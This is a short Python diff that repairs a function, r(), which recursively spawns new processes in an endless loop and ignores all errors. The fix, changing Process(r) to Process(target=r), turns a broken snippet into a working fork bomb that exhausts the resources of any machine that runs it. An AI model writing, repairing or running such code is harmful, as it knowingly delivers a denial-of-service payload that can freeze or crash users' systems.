@@ -19,7 +19,10 @@ from multiprocessing import Queue, Process
 def r():
 	while True:
 		try:
-			Process(r).start()
+			print "*",
+			x = Process(target=r)
+			x.start()
+			print "*",
 		except:
 			continue
 
